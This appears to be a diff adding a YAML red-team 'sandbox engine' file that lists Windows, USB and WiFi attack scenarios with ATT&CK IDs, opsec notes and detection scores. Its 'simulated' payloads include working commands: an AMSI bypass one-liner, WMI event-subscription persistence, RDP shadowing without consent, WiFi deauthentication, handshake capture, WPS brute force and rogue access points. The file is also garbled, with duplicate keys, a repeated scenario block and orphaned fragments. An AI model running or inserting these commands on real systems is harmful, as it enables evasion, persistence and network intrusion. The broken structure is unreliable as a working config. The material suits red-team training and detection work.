@@ -1,0 +1,766 @@
+# 🔬 lab_sandbox_engine.yaml
+# Level-2 Sandbox-Engine mit TTP-Phasenlogik und Simulations-Timeline
+
+sandbox_scenarios:
+- id: scenario_001
+  title: "Initial Access via Phishing – HKCU Persistence"
+  tags: [initial_access, persistence, simulation]
+  validation_required: true
+  author: "bmm_core"
+  reviewed_by: null
+
+  phases:
+    - name: Initial Access
+      ttp: T1566.001
+      description: "User clicks on macro-enabled Word document."
+      payload_stub: "[PHISHING_MACRO_PAYLOAD]"
+      opsec_notes: "Low user suspicion, high AV signature"
+      countermeasures: "AppLocker policy may block macro execution"
+      log_events:
+        - type: winword.exe spawn
+        - type: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+        - type: outlook.exe traffic
+      detection_score: 4.2
+
+    - name: Persistence
+      ttp: T1547.001
+      description: "HKCU Run Key used for persistence."
+      payload_stub: "[HKCU_REG_PERSISTENCE]"
+      opsec_notes: "Stealthy across reboots, user-space key"
+      countermeasures: "Defender detects Run key injection with moderate confidence"
+      log_events:
+        - type: registry_change
+        - type: autorun_entry_creation
+      detection_score: 6.8
+
+  timeline:
+    - time: T+0s
+      phase: Initial Access
+    - time: T+30s
+      phase: Persistence
+
+- id: test_001
+  title: "Sim: Scheduled Task Persistence"
+  validation_required: true
+  author: "test_user"
+  reviewed_by: null
+
+- id: mb_chain_oauth_graph
+  title: "OAuth Initial Access via BitB + MSGraph Beacon"
+  tags: [initial_access, c2, oauth, msgraph]
+  validation_required: true
+  author: "bmm_core"
+  phases:
+    - name: OAuth_Phish
+      ttp: T1566.002
+      description: "Browser-in-the-Browser Phish zur Tokenextraktion"
+      payload_stub: |
+        <!-- BEGIN_SIMULATED_PAYLOAD -->
+        <iframe src="https://login.microsoftonline.com/" style="border:none;width:400px;height:300px;"></iframe>
+        <!-- END_SIMULATED_PAYLOAD -->
+      opsec_notes: "BitB-Fenster schwer erkennbar, hohe Plausibilität"
+      log_events:
+        - type: oauth_token_issued
+        - type: ui_phish_render
+      detection_score: 5.2
+
+    - name: GraphC2
+      ttp: T1071.001
+      description: "Missbrauch des MSGraph API zur Beacon-Kommunikation"
+      payload_stub: |
+        # BEGIN_SIMULATED_PAYLOAD
+        $token = "oauth_token_xyz"
+        Invoke-RestMethod -Headers @{Authorization = "Bearer $token"} -Uri "https://graph.microsoft.com/v1.0/me/messages"
+        logger "[SIM] Graph API Beacon aktiv"
+        # END_SIMULATED_PAYLOAD
+      opsec_notes: "Legitime Infrastruktur, schwer filterbar"
+      log_events:
+        - type: api_call_msgraph
+        - type: dns_request_msapi
+      detection_score: 6.1
+
+- id: mb_chain_msbuild_wmi
+  title: "Dual-Stage Persistence: MSBuild + WMI"
+  tags: [persistence, lolbin, msbuild, wmi]
+  validation_required: true
+  author: "bmm_core"
+  phases:
+    - name: MSBuildInject
+      ttp: T1127.001
+      description: "MSBuild-Missbrauch für Inline-Ausführung via XML"
+      payload_stub: |
+        <!-- BEGIN_SIMULATED_PAYLOAD -->
+        <Project>
+          <Target Name="ObfuscationExec">
+            <CodeTaskFactory>
+              <Code>Console.WriteLine("Injected");</Code>
+            </CodeTaskFactory>
+          </Target>
+        </Project>
+        <!-- END_SIMULATED_PAYLOAD -->
+      opsec_notes: "Trusted Binary Execution mit legitimer Signatur"
+      log_events:
+        - type: msbuild_execution
+        - type: xml_script_load
+      detection_score: 7.4
+
+    - name: WMIPersist
+      ttp: T1546.003
+      description: "WMI Event Consumer für persistente Aktionen"
+      payload_stub: |
+        # BEGIN_SIMULATED_PAYLOAD
+        $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ Name = "Auto"; Query = "SELECT * FROM __InstanceModificationEvent" }
+        $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{ CommandLineTemplate = "powershell -nop -c echo Hello" }
+        Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{ Filter = $Filter; Consumer = $Consumer }
+        # END_SIMULATED_PAYLOAD
+      opsec_notes: "Wird oft übersehen – ideal für stille Persistenz"
+      log_events:
+        - type: wmi_filter_created
+        - type: wmi_consumer_bind
+      detection_score: 8.0
+
+  phases:
+    - name: Initial Access
+      ttp: T1059.003
+      description: "Shortcut dropped to Startup folder."
+      payload_stub: "[DROP_SHORTCUT_PAYLOAD]"
+      opsec_notes: "Low sophistication, easy to detect with file system monitoring"
+      countermeasures: "Group Policy disables Startup folder; file audit logs catch drop"
+      log_events:
+        - type: file_write
+        - type: shortcut_creation
+      detection_score: 3.2
+
+    - name: Persistence
+      ttp: T1053.005
+      description: "schtasks used to maintain access."
+      payload_stub: "[SCHTASKS_CMD_PERSISTENCE]"
+      opsec_notes: "Moderate stealth, common admin tool, higher visibility under EDR"
+      countermeasures: "Monitor schtasks usage; alert on task with suspicious name or path"
+      log_events:
+        - type: scheduled_task_created
+      detection_score: 6.0
+
+
+- id: bunny_usb_drop
+  title: "Payload Injection via Bash Bunny USB Drop"
+  environment:
+      os: Windows 10
+      user_role: Standard User
+  stages:
+      - phase: Initial Access
+        vector: "USB HID Emulation"
+        payload:
+          description: "Simuliertes Bash Bunny Skript zur Ausführung von PowerShell über USB."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            powershell -nop -w hidden -c "echo Simulated USB Payload Execution"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 1, parentImage: explorer.exe, image: powershell.exe]
+          defender: [Suspicious USB activity]
+        opsec:
+          noise: 6
+          plausibility: 8
+          footprint: 7
+
+- id: lan_turtle_dns_pivot
+  title: "DNS Pivoting mit LAN Turtle"
+  environment:
+      os: Windows Server 2019
+      network: Internal VLAN
+  stages:
+      - phase: Lateral Movement
+        vector: "Internal DNS Poisoning via Remote Access Toolkit"
+        payload:
+          description: "Simulierter Reverse SSH Tunnel mit DNS Manipulation"
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            echo "Starting DNS Spoof Daemon"
+            logger "Reverse SSH active – DNS pivot initialized"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 3, network connection to uncommon port]
+          firewall: [Unusual SSH tunnel behavior]
+        opsec:
+          noise: 4
+          plausibility: 7
+          footprint: 5
+
+- id: satanimus_wmi_chain
+  title: "SATANIMUS Ritual – WMI Invocation Chain"
+  environment:
+      os: Windows 11
+      user_role: Local Admin
+  stages:
+      - phase: Persistence
+        vector: "WMI Event Filter with Thematic Payload"
+        payload:
+          description: "Simulierte Invocation eines PowerShell Commands durch WMI Trigger mit lateinischer Namensgebung."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ Name = "DaemonisInvocatio"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogicalDisk'" }
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 19, WMI filter creation]
+          edr: [Behavioral WMI alert]
+        opsec:
+          noise: 5
+          plausibility: 9
+          footprint: 6
+
+- id: hypervisor_escape
+  title: "VM Escape über simuliertes Treiber-Exploit"
+  environment:
+      os: Hyper-V Host
+      user_role: Guest VM
+  stages:
+      - phase: Privilege Escalation
+        vector: "VirtIO-Treiber Angriff (simuliert)"
+        payload:
+          description: "Simulierter Exploit zur Eskalation von VM auf Host-Kontext."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            echo "VirtIO driver fuzz event triggered"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          edr: [Unusual guest-to-host syscall pattern]
+        opsec:
+          noise: 7
+          plausibility: 5
+          footprint: 8
+
+- id: browser_token_exfil
+  title: "Token Exfiltration via Browser Extension"
+  environment:
+      os: Windows 10
+      user_role: Standard User
+      browser: Chromium
+  stages:
+      - phase: Credential Access
+        vector: "Injected JavaScript in browser context"
+        payload:
+          description: "Simuliertes Stehlen eines Session-Tokens durch DOM Access."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            document.cookie = "session=leakme";
+            # END_SIMULATED_PAYLOAD
+        detection:
+          edr: [Browser child process token activity]
+        opsec:
+          noise: 3
+          plausibility: 8
+          footprint: 4
+
+- id: lolbin_rdp_shadow
+  title: "RDP Shadowing via MSTSC"
+  environment:
+      os: Windows Server 2022
+      user_role: Administrator
+  stages:
+      - phase: Defense Evasion
+        vector: "Built-in RDP tools misused"
+        payload:
+          description: "Simuliertes Shadowing bestehender RDP Session."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            mstsc.exe /shadow:1 /control /noConsentPrompt
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 1, mstsc.exe unusual params]
+        opsec:
+          noise: 2
+          plausibility: 9
+          footprint: 5
+
+- id: smb_lateral_plaincreds
+  title: "Lateral Movement via SMB with Plaintext Credentials"
+  environment:
+      os: Windows 10
+      network: Domain
+  stages:
+      - phase: Lateral Movement
+        vector: "SMB Share Access with stolen creds"
+        payload:
+          description: "Simulierter Zugriff auf Admin Shares via smbclient."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            smbclient \\10.0.0.5\ADMIN$ -U admin%Password123
+            # END_SIMULATED_PAYLOAD
+        detection:
+          firewall: [Outbound SMB access]
+          edr: [Unusual auth context]
+        opsec:
+          noise: 5
+          plausibility: 7
+          footprint: 6
+
+- id: wifi_dos_probe_spam
+  title: "WiFi Deauth via Probe Request Flood"
+  environment:
+      os: N/A
+      device: Wireless NIC
+  stages:
+      - phase: Denial of Service
+        vector: "Beacon/Probe Injection"
+        payload:
+          description: "Simulierter Flood von Probe Requests im WLAN."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [Wireless anomaly, channel saturation]
+        opsec:
+          noise: 10
+          plausibility: 4
+          footprint: 9
+
+- id: powershell_amsi_bypass
+  title: "AMSI Bypass mit reflektierter Assembly"
+  environment:
+      os: Windows 10
+      user_role: Admin
+  stages:
+      - phase: Execution
+        vector: "PowerShell Reflection"
+        payload:
+          description: "Simulierter Bypass von AMSI durch Inline Reflection."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [PowerShell module access]
+          edr: [Memory patch behavior]
+        opsec:
+          noise: 4
+          plausibility: 6
+          footprint: 7
+
+- id: exfil_usb_mtp
+  title: "Datenexfiltration via USB-MTP"
+  environment:
+      os: Windows 10
+      user_role: Standard User
+  stages:
+      - phase: Exfiltration
+        vector: "Media Transfer Protocol Abuse"
+        payload:
+          description: "Simulierter Datenklau durch automatisierten MTP-Pull."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            adb pull /sdcard/DCIM/secret.jpg
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [MTP access pattern]
+        opsec:
+          noise: 6
+          plausibility: 7
+          footprint: 6
+sandbox_scenarios:
+
+  - id: bunny_usb_drop
+    title: "Payload Injection via Bash Bunny USB Drop"
+    environment:
+      os: Windows 10
+      user_role: Standard User
+    stages:
+      - phase: Initial Access
+        vector: "USB HID Emulation"
+        payload:
+          description: "Simuliertes Bash Bunny Skript zur Ausführung von PowerShell über USB."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            powershell -nop -w hidden -c "echo Simulated USB Payload Execution"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 1, parentImage: explorer.exe, image: powershell.exe]
+          defender: [Suspicious USB activity]
+        opsec:
+          noise: 6
+          plausibility: 8
+          footprint: 7
+
+  - id: lan_turtle_dns_pivot
+    title: "DNS Pivoting mit LAN Turtle"
+    environment:
+      os: Windows Server 2019
+      network: Internal VLAN
+    stages:
+      - phase: Lateral Movement
+        vector: "Internal DNS Poisoning via Remote Access Toolkit"
+        payload:
+          description: "Simulierter Reverse SSH Tunnel mit DNS Manipulation"
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            echo "Starting DNS Spoof Daemon"
+            logger "Reverse SSH active – DNS pivot initialized"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 3, network connection to uncommon port]
+          firewall: [Unusual SSH tunnel behavior]
+        opsec:
+          noise: 4
+          plausibility: 7
+          footprint: 5
+
+  - id: satanimus_wmi_chain
+    title: "SATANIMUS Ritual – WMI Invocation Chain"
+    environment:
+      os: Windows 11
+      user_role: Local Admin
+    stages:
+      - phase: Persistence
+        vector: "WMI Event Filter with Thematic Payload"
+        payload:
+          description: "Simulierte Invocation eines PowerShell Commands durch WMI Trigger mit lateinischer Namensgebung."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ Name = "DaemonisInvocatio"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogicalDisk'" }
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 19, WMI filter creation]
+          edr: [Behavioral WMI alert]
+        opsec:
+          noise: 5
+          plausibility: 9
+          footprint: 6
+
+  - id: hypervisor_escape
+    title: "VM Escape über simuliertes Treiber-Exploit"
+    environment:
+      os: Hyper-V Host
+      user_role: Guest VM
+    stages:
+      - phase: Privilege Escalation
+        vector: "VirtIO-Treiber Angriff (simuliert)"
+        payload:
+          description: "Simulierter Exploit zur Eskalation von VM auf Host-Kontext."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            echo "VirtIO driver fuzz event triggered"
+            # END_SIMULATED_PAYLOAD
+        detection:
+          edr: [Unusual guest-to-host syscall pattern]
+        opsec:
+          noise: 7
+          plausibility: 5
+          footprint: 8
+
+  - id: browser_token_exfil
+    title: "Token Exfiltration via Browser Extension"
+    environment:
+      os: Windows 10
+      user_role: Standard User
+      browser: Chromium
+    stages:
+      - phase: Credential Access
+        vector: "Injected JavaScript in browser context"
+        payload:
+          description: "Simuliertes Stehlen eines Session-Tokens durch DOM Access."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            document.cookie = "session=leakme";
+            # END_SIMULATED_PAYLOAD
+        detection:
+          edr: [Browser child process token activity]
+        opsec:
+          noise: 3
+          plausibility: 8
+          footprint: 4
+
+  - id: lolbin_rdp_shadow
+    title: "RDP Shadowing via MSTSC"
+    environment:
+      os: Windows Server 2022
+      user_role: Administrator
+    stages:
+      - phase: Defense Evasion
+        vector: "Built-in RDP tools misused"
+        payload:
+          description: "Simuliertes Shadowing bestehender RDP Session."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            mstsc.exe /shadow:1 /control /noConsentPrompt
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [EventID 1, mstsc.exe unusual params]
+        opsec:
+          noise: 2
+          plausibility: 9
+          footprint: 5
+
+  - id: smb_lateral_plaincreds
+    title: "Lateral Movement via SMB with Plaintext Credentials"
+    environment:
+      os: Windows 10
+      network: Domain
+    stages:
+      - phase: Lateral Movement
+        vector: "SMB Share Access with stolen creds"
+        payload:
+          description: "Simulierter Zugriff auf Admin Shares via smbclient."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            smbclient \\10.0.0.5\ADMIN$ -U admin%Password123
+            # END_SIMULATED_PAYLOAD
+        detection:
+          firewall: [Outbound SMB access]
+          edr: [Unusual auth context]
+        opsec:
+          noise: 5
+          plausibility: 7
+          footprint: 6
+
+  - id: wifi_dos_probe_spam
+    title: "WiFi Deauth via Probe Request Flood"
+    environment:
+      os: N/A
+      device: Wireless NIC
+    stages:
+      - phase: Denial of Service
+        vector: "Beacon/Probe Injection"
+        payload:
+          description: "Simulierter Flood von Probe Requests im WLAN."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [Wireless anomaly, channel saturation]
+        opsec:
+          noise: 10
+          plausibility: 4
+          footprint: 9
+
+  - id: powershell_amsi_bypass
+    title: "AMSI Bypass mit reflektierter Assembly"
+    environment:
+      os: Windows 10
+      user_role: Admin
+    stages:
+      - phase: Execution
+        vector: "PowerShell Reflection"
+        payload:
+          description: "Simulierter Bypass von AMSI durch Inline Reflection."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [PowerShell module access]
+          edr: [Memory patch behavior]
+        opsec:
+          noise: 4
+          plausibility: 6
+          footprint: 7
+
+  - id: exfil_usb_mtp
+    title: "Datenexfiltration via USB-MTP"
+    environment:
+      os: Windows 10
+      user_role: Standard User
+    stages:
+      - phase: Exfiltration
+        vector: "Media Transfer Protocol Abuse"
+        payload:
+          description: "Simulierter Datenklau durch automatisierten MTP-Pull."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            adb pull /sdcard/DCIM/secret.jpg
+            # END_SIMULATED_PAYLOAD
+        detection:
+          sysmon: [MTP access pattern]
+        opsec:
+          noise: 6
+          plausibility: 7
+          footprint: 6
+
+  - id: wifi_probe_spoofing
+    title: "WiFi Probe Spoofing zur SSID-Täuschung"
+    environment:
+      os: N/A
+      device: Wireless Adapter
+    stages:
+      - phase: Reconnaissance
+        vector: "Fake SSID Broadcasting"
+        payload:
+          description: "Simulierter Angriff zur Imitation bekannter WLANs."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            airbase-ng -e "FreeWiFi" -c 6 wlan0
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [Multiple SSID beacons from rogue device]
+        opsec:
+          noise: 8
+          plausibility: 5
+          footprint: 8
+
+  - id: wifi_handshake_capture
+    title: "WPA Handshake Capture"
+    environment:
+      os: Kali Linux
+      device: Wireless Adapter
+    stages:
+      - phase: Credential Access
+        vector: "Deauth + Capture"
+        payload:
+          description: "Simulierter WPA2 4-Way Handshake Capture zur Offline-Crack-Vorbereitung."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            airodump-ng -c 11 --bssid 00:11:22:33:44:55 -w handshake wlan0
+            aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [Beacon loss, handshake anomalies]
+        opsec:
+          noise: 9
+          plausibility: 6
+          footprint: 9
+
+  - id: wifi_hidden_ssid_beaconing
+    title: "Hidden SSID Detection"
+    environment:
+      os: Kali Linux
+      device: Wireless Adapter
+    stages:
+      - phase: Reconnaissance
+        vector: "Beacon Response Analysis"
+        payload:
+          description: "Simulierte Erkennung versteckter SSIDs durch aktives Scanning."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            kismet -c wlan0
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [Unusual scanning activity, probe responses]
+        opsec:
+          noise: 5
+          plausibility: 9
+          footprint: 6
+
+  - id: wifi_wps_bruteforce
+    title: "WPS PIN Brute-Forcing"
+    environment:
+      os: Linux
+      device: Wireless Adapter
+    stages:
+      - phase: Credential Access
+        vector: "Pixie Dust Attack / Reaver"
+        payload:
+          description: "Simulierter Bruteforce auf WiFi Protected Setup PIN."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            reaver -i wlan0 -b 00:11:22:33:44:55 -vv
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [WPS anomaly, repeated association requests]
+        opsec:
+          noise: 9
+          plausibility: 4
+          footprint: 8
+
+  - id: wifi_captive_portal_injection
+    title: "Captive Portal Injection mit Credential Stealer"
+    environment:
+      os: Linux
+      device: Wireless Adapter
+    stages:
+      - phase: Initial Access
+        vector: "Captive Portal Fake Login"
+        payload:
+          description: "Simuliertes Stehlen von Logindaten via Fake Captive Portal."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            hostapd + dnsmasq + nginx FakePortal
+            # END_SIMULATED_PAYLOAD
+        detection:
+          ids: [DNS anomalies, unauthorized AP beacon]
+        opsec:
+          noise: 7
+          plausibility: 7
+          footprint: 8
+
+  - id: wifi_full_attack_chain
+    title: "WiFi Full Chain: Rogue AP → Phish → Token Replay"
+    environment:
+      os: Linux, Windows 10
+      device: Wireless Adapter
+    stages:
+      - phase: Initial Access
+        vector: "Rogue AP"
+        payload:
+          description: "Simulierter Rogue Access Point mit EvilAP config."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            airbase-ng -e EvilAP -c 6 wlan0
+            # END_SIMULATED_PAYLOAD
+      - phase: Credential Harvesting
+        vector: "Fake Portal Credential Steal"
+        payload:
+          description: "Simulierte Dateneingabe durch Benutzer auf Fake-Login-Seite."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            echo "POST /login with user + pass"
+            # END_SIMULATED_PAYLOAD
+      - phase: Post-Access Abuse
+        vector: "Token Replay via Cookie Injection"
+        payload:
+          description: "Simulierter Replay der geklauten Session in legitimen Kontext."
+          type: simulated
+          content: |
+            # BEGIN_SIMULATED_PAYLOAD
+            curl --cookie sessionid=abc123 https://portal.company.local/
+            # END_SIMULATED_PAYLOAD
+
+
+
+
+
+
+    timeline:
+    - time: T+0s
+      phase: Initial Access
+    - time: T+45s
+      phase: Persistence
+
+    control_flow:
+    branches: []
+    failure: []
+
+
+
+
+  # Reserved: optional branching logic for future phase 3
+    control_flow:
+    branches: []
+    failure: []
